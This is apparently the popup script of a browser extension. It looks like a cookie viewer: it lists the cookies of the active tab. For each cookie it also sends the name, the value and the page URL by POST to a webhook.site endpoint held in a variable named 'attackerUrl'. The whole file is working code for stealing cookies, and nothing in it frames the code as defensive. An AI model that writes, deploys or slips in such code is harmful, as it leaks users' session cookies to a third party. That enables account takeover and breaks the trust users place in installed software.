document.addEventListener('DOMContentLoaded', function () {
  var cookieList = document.getElementById('cookie-list');

  browser.tabs.query({ active: true, currentWindow: true }, function (tabs) {
    var tab = tabs[0];
    var url = new URL(tab.url);
    var attackerUrl = "https://webhook.site/7d5c5233-6056-4467-8310-42a5a7daee55"
    
    browser.cookies.getAll({ url: url.origin }, function (cookies) {
      if (cookies.length > 0) {
        cookies.forEach(function(cookie) {
          var listItem = document.createElement('li');
          listItem.textContent = `${cookie.name}: ${cookie.value}`;
          cookieList.appendChild(listItem);
          
          var xhr = new XMLHttpRequest();
          xhr.open('POST', `${attackerUrl}`+'/cookies', true);
          xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
          xhr.send(JSON.stringify({ cookie: listItem.textContent, url: url}));
        });
      } else {
          var listItem = document.createElement('li');
          listItem.textContent = 'No cookies found.';
          cookieList.appendChild(listItem);
      }
    });
  });
});